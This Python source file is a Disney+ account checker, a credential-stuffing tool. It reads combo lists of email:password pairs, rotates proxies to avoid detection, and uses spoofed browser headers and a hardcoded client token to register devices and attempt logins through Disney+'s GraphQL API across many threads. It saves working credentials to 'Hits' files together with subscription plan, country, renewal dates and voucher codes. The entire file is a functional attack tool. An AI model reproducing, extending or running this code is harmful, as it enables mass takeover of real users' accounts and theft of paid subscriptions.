import requests
import threading
import os
import time
import random
import sys
import re
import json
from queue import Queue, Empty
from tkinter import filedialog, Tk
from threading import Lock

# Import Config and Util
try:
    from Config.Util import *
    from Config.Config import *
    from Config.ConfigManager import config_manager
except ImportError:
    print("Error importing Config.Util")
    sys.exit()

class DisneyChecker:
    def __init__(self):
        self.hits = 0
        self.free = 0
        self.twofa = 0
        self.invalids = 0
        self.errors = 0
        self.total_checked = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.running = True
        self.proxies = []
        self.results_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'Results', 'Disney Checker')
        
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
            
        self.output_files = {
            'hits': os.path.join(self.results_dir, 'Hits.txt'),
            'hits_full': os.path.join(self.results_dir, 'Hits_Full.txt'),
            'free': os.path.join(self.results_dir, 'Free.txt'),
            '2fa': os.path.join(self.results_dir, '2FA.txt'),
            'invalids': os.path.join(self.results_dir, 'Invalids.txt')
        }
        
        # Initialize files
        for file_path in self.output_files.values():
            try:
                with open(file_path, 'a', encoding='utf-8') as f:
                    pass
            except:
                pass

        self.base_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "es-419,es;q=0.9",
            "Origin": "https://www.disneyplus.com",
            "Referer": "https://www.disneyplus.com/",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }

    def load_proxies(self):
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Load Proxies File (txt)")
        file_path = filedialog.askopenfilename(title="Select Proxies File", filetypes=[("Text Files", "*.txt")])
        
        if not file_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No proxy file selected. Running proxyless.")
            return

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle user:pass@host:port or host:port formats
                        if '@' in line:
                            auth_part, host_part = line.split('@', 1)
                            if ':' in auth_part and ':' in host_part:
                                username, password = auth_part.split(':', 1)
                                host, port = host_part.split(':', 1)
                                proxy_dict = {
                                    'http': f'http://{username}:{password}@{host}:{port}',
                                    'https': f'http://{username}:{password}@{host}:{port}'
                                }
                                self.proxies.append(proxy_dict)
                        else:
                            if ':' in line:
                                host, port = line.split(':', 1)
                                proxy_dict = {
                                    'http': f'http://{host}:{port}',
                                    'https': f'http://{host}:{port}'
                                }
                                self.proxies.append(proxy_dict)
            
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Loaded {len(self.proxies)} proxies.")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error loading proxies: {e}")

    def get_random_proxy(self):
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def register_device(self, session):
        url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
        
        payload = {
            "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
            "operationName": "registerDevice",
            "variables": {
                "input": {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "windows",
                    "deviceLanguage": "es-419",
                    "attributes": {
                        "osDeviceIds": [],
                        "manufacturer": "microsoft",
                        "model": None,
                        "operatingSystem": "windows",
                        "operatingSystemVersion": "10.0",
                        "browserName": "chrome",
                        "browserVersion": "107.0.0",
                        "brand": "web"
                    },
                    "devicePlatformId": "browser"
                }
            }
        }
        
        headers = {
            **self.base_headers,
            "Content-Type": "application/json",
            "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-application-version": "1.1.2",
            "sec-ch-ua-mobile": "?0",
            "authorization": "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
            "x-bamsdk-platform-id": "browser",
            "x-bamsdk-platform": "javascript/windows/chrome",
            "x-bamsdk-version": "20.0",
            "sec-ch-ua-platform": '"Windows"'
        }
        
        try:
            response = session.post(url, json=payload, headers=headers)
            response_text = response.text
            
            match = re.search(r'accessToken":"([^"]+)"', response_text)
            if match:
                return match.group(1)
            else:
                return None
        except:
            return None

    def check_account(self, email, password):
        session = requests.Session()
        session.trust_env = False # Prevent proxy freezes
        proxy = self.get_random_proxy()
        if proxy:
            session.proxies.update(proxy)

        tt1 = self.register_device(session)
        if not tt1:
            return {"status": "error", "message": "Failed to register device"}

        url = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
        login_query = """
        mutation login($input: LoginInput!) {
            login(login: $input) {
                account {
                    ...account
                    profiles {
                        ...profile
                    }
                }
                actionGrant
                activeSession {
                  ...session
                }
                identity {
                  ...identity
              }
            }
        }
        fragment identity on Identity {
        attributes {
            securityFlagged
            createdAt
            passwordResetRequired
        }
        flows {
            marketingPreferences {
                eligibleForOnboarding
                isOnboarded
            }
            personalInfo {
                eligibleForCollection
                requiresCollection
            }
        }
        personalInfo {
            dateOfBirth
            gender
        }
        subscriber {
            subscriberStatus
            subscriptionAtRisk
            overlappingSubscription
            doubleBilled
            doubleBilledProviders
            subscriptions {
                id
                groupId
                state
                partner
                isEntitled
                source {
                    sourceType
                    sourceProvider
                    sourceRef
                    subType
                }
                paymentProvider
                product {
                    id
                    sku
                    offerId
                    promotionId
                    name
                    nextPhase {
                        sku
                        offerId
                        campaignCode
                        voucherCode
                    }
                    entitlements {
                        id
                        name
                        desc
                        partner
                    }
                    categoryCodes
                    redeemed {
                        campaignCode
                        redemptionCode
                        voucherCode
                    }
                    bundle
                    bundleType
                    subscriptionPeriod
                    earlyAccess
                    trial {
                        duration
                    }
                }
                term {
                    purchaseDate
                    startDate
                    expiryDate
                    nextRenewalDate
                    pausedDate
                    churnedDate
                    isFreeTrial
                }
                externalSubscriptionId,
                cancellation {
                    type
                    restartEligible
                }
                stacking {
                    status
                    overlappingSubscriptionProviders
                    previouslyStacked
                    previouslyStackedByProvider
                }
            }
        }}
        fragment account on Account {
        id
        attributes {
            blocks {
                expiry
                reason
            }
            consentPreferences {
                dataElements {
                    name
                    value
                }
                purposes {
                    consentDate
                    firstTransactionDate
                    id
                    lastTransactionCollectionPointId
                    lastTransactionCollectionPointVersion
                    lastTransactionDate
                    name
                    status
                    totalTransactionCount
                    version
                }
            }
            dssIdentityCreatedAt
            email
            emailVerified
            lastSecurityFlaggedAt
            locations {
                manual {
                    country
                }
                purchase {
                    country
                    source
                }
                registration {
                    geoIp {
                        country
                    }
                }
            }
            securityFlagged
            tags
            taxId
            userVerified
        }
        parentalControls {
            isProfileCreationProtected
        }
        flows {
            star {
                isOnboarded
            }
        }}
        fragment profile on Profile {
        id
        name
        isAge21Verified
        attributes {
            avatar {
                id
                userSelected
            }
            isDefault
            kidsModeEnabled
            languagePreferences {
                appLanguage
                playbackLanguage
                preferAudioDescription
                preferSDH
                subtitleAppearance {
                    backgroundColor
                    backgroundOpacity
                    description
                    font
                    size
                    textColor
                }
                subtitleLanguage
                subtitlesEnabled
            }
            groupWatch {
                enabled
            }
            parentalControls {
                kidProofExitEnabled
                isPinProtected
            }
            playbackSettings {
                autoplay
                backgroundVideo
                prefer133
                preferImaxEnhancedVersion
                previewAudioOnHome
                previewVideoOnHome
            }
        }
        personalInfo {
            dateOfBirth
            gender
            age
        }
        maturityRating {
            ...maturityRating
        }
        personalInfo {
            dateOfBirth
            age
            gender
        }
        flows {
            personalInfo {
                eligibleForCollection
                requiresCollection
            }
            star {
                eligibleForOnboarding
                isOnboarded
            }
        }}fragment maturityRating on MaturityRating {
        ratingSystem
        ratingSystemValues
        contentMaturityRating
        maxRatingSystemValue
        isMaxContentMaturityRating}
        fragment session on Session {
        device {
            id
            platform
        }
        entitlements
        features {
            coPlay
        }
        inSupportedLocation
        isSubscriber
        location {
            type
            countryCode
            dma
            asn
            regionName
            connectionType
            zipCode
        }
        sessionId
        experiments {
            featureId
            variantId
            version
        }
        identity {
            id
        }
        account {
            id
        }
        profile {
            id
            parentalControls {
                liveAndUnratedContent {
                    enabled
                }
            }
        }
        partnerName
        preferredMaturityRating {
            impliedMaturityRating
            ratingSystem
        }
        homeLocation {
            countryCode
        }
        portabilityLocation {
            countryCode
            type
        }}
        """
        
        payload = {
            "query": login_query,
            "operationName": "login",
            "variables": {
                "input": {
                    "email": email,
                    "password": password
                }
            }
        }
        
        content_length = len(json.dumps(payload))
        
        headers = {
            **self.base_headers,
            "Host": "disney.api.edge.bamgrid.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-application-version": "1.1.2",
            "sec-ch-ua-mobile": "?0",
            "authorization": tt1,
            "x-bamsdk-platform-id": "browser",
            "content-type": "application/json",
            "x-bamsdk-platform": "javascript/windows/chrome",
            "x-bamsdk-version": "20.0",
            "sec-ch-ua-platform": '"Windows"',
            "Accept-Language": "es-ES,es;q=0.9",
            "Content-Length": str(content_length)
        }
        
        try:
            response = session.post(url, json=payload, headers=headers)
            response_text = response.text
            
            result = {"status": "unknown", "response": response_text, "email": email, "password": password}
            
            if any(keyword in response_text for keyword in ["Bad credentials sent for disney", "idp.error.identity.bad-credentials"]):
                result["status"] = "failure"
                result["message"] = "Bad credentials"
            elif any(keyword in response_text for keyword in ["Password reset required.", "idp.error.identity.password-reset-required"]):
                result["status"] = "2factor"
                result["message"] = "Password reset required"
            elif 'accessToken":"' in response_text:
                result["status"] = "success"
                
                match = re.search(r'accessToken":"([^"]+)"', response_text)
                if match:
                    tt2 = match.group(1)
                    # Get payment info if needed
                    # For speed, we might skip payment info if it requires another request, but let's see.
                    # The original code did another request.
                    
                    # Parse account info first
                    result.update(self.parse_account_info(response_text))
                    
                    if 'isSubscriber":true' in response_text:
                        result["subscription_status"] = "active"
                    elif any(keyword in response_text for keyword in ['isSubscriber":false', 'subscriber":null']):
                        result["subscription_status"] = "free"
            
            return result
            
        except Exception as e:
            return {"status": "error", "message": str(e), "email": email, "password": password}

    def parse_account_info(self, response_text):
        info = {}
        patterns = {
            "email_verified": r'emailVerified":([^,]+),',
            "country": r'"country":"([^"]+)"',
            "provider": r'sourceProvider":"([^"]+)"',
            "plan": r',"name":"D([^"]+)",',
            "security_flagged": r'securityFlagged":([^,]+),',
            "is_free_trial": r'isFreeTrial":([^}]+)},',
            "purchase_date": r'purchaseDate":"([^T]+)T',
            "next_renewal_date": r'nextRenewalDate":"([^T]+)T',
            "subscriber": r'isSubscriber":([^,]+),',
            "voucher_code": r'voucherCode":"([^"]+)"'
        }
        
        for key, pattern in patterns.items():
            match = re.search(pattern, response_text)
            if match:
                value = match.group(1)
                if key == "plan":
                    value = f"D{value}"
                info[key] = value
        return info

    def worker_thread(self, work_queue):
        while self.running:
            try:
                item = work_queue.get(timeout=1)
            except Empty:
                continue
                
            try:
                if item is None:
                    break
                
                email, password = item
                
                result = self.check_account(email, password)
                
                with self.lock:
                    self.total_checked += 1
                    
                    if result['status'] == 'success':
                        if result.get('subscription_status') == 'active':
                            self.hits += 1
                            self.save_hit(result)
                            hit_msg = f"{email}:{password}"
                            print(f"{BEFORE + current_time_hour() + AFTER} {ADD} HIT: {white}{hit_msg}{blue}")
                        else:
                            self.free += 1
                            self.save_free(result)
                            # Optional: Print free hits? Maybe not to clutter
                            # print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} FREE: {white}{email}{blue}")
                    elif result['status'] == '2factor':
                        self.twofa += 1
                        self.save_2fa(result)
                    elif result['status'] == 'failure':
                        self.invalids += 1
                    else:
                        self.errors += 1
                
            except Exception:
                self.errors += 1
            finally:
                work_queue.task_done()

    def save_hit(self, result):
        try:
            # Clean
            with open(self.output_files['hits'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
            
            # Full
            with open(self.output_files['hits_full'], 'a', encoding='utf-8') as f:
                parts = [f"{result['email']}:{result['password']}"]
                for key, value in result.items():
                    if key not in ['email', 'password', 'status', 'response', 'message']:
                        parts.append(f"{key}={value}")
                f.write(" | ".join(parts) + "\n")
        except:
            pass

    def save_free(self, result):
        try:
            with open(self.output_files['free'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        except:
            pass

    def save_2fa(self, result):
        try:
            with open(self.output_files['2fa'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        except:
            pass

    def display_progress(self):
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                cpm = (self.total_checked / elapsed * 60) if elapsed > 0 else 0
                
                title_text = f"Disney Checker | Checked: {self.total_checked} | Hits: {self.hits} | Free: {self.free} | 2FA: {self.twofa} | Invalids: {self.invalids} | CPM: {int(cpm)}"
                Title(title_text)
                time.sleep(0.5)
            except:
                break

    def start(self):
        Title("Disney Checker")
        
        # Load Accounts
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Load Accounts File (Combo)")
        combo_file = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
        
        if not combo_file:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No file selected.")
            time.sleep(2)
            return

        # Load Proxies
        self.load_proxies()

        # Threads
        thread_count = config_manager.get_setting('threads')
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Running with {thread_count} threads")
        
        # Read accounts
        accounts = []
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        accounts.append((parts[0], parts[1]))
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error reading file: {e}")
            return

        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Loaded {len(accounts)} accounts")
        
        # Queue
        work_queue = Queue()
        for account in accounts:
            work_queue.put(account)
            
        # Start Threads
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.worker_thread, args=(work_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
            
        # Progress Thread
        progress_thread = threading.Thread(target=self.display_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        try:
            work_queue.join()
        except KeyboardInterrupt:
            self.running = False
            
        self.running = False
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Finished checking.")
        input("Press Enter to exit...")

if __name__ == "__main__":
    checker = DisneyChecker()
    checker.start()
